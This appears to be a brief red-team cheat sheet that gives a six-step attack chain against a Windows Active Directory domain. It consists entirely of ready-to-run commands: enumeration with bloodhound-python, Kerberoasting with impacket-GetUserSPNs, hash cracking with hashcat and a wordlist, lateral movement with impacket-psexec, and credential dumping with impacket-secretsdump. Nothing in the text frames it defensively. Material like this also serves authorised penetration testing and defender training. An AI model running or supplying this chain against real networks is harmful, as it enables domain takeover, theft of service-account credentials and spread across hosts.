# Step 1 - Enumerate with credentials
bloodhound-python -d domain.local -u user -p pass -ns $DC -c all
# Import to BloodHound

# Step 2 - Look for Kerberoastable accounts
impacket-GetUserSPNs domain.local/user:pass -request

# Step 3 - Crack service account
hashcat -m 13100 -a 0 hashes.txt rockyou.txt

# Step 4 - Check if service account has special privileges
crackmapexec ldap $DC -u service_account -p cracked_pass -M admincount

# Step 5 - Pivot to another host
impacket-psexec domain.local/service_account:cracked_pass@OTHER_HOST

# Step 6 - From new host, run mimikatz/secretsdump
impacket-secretsdump domain.local/service_account:cracked_pass@OTHER_HOST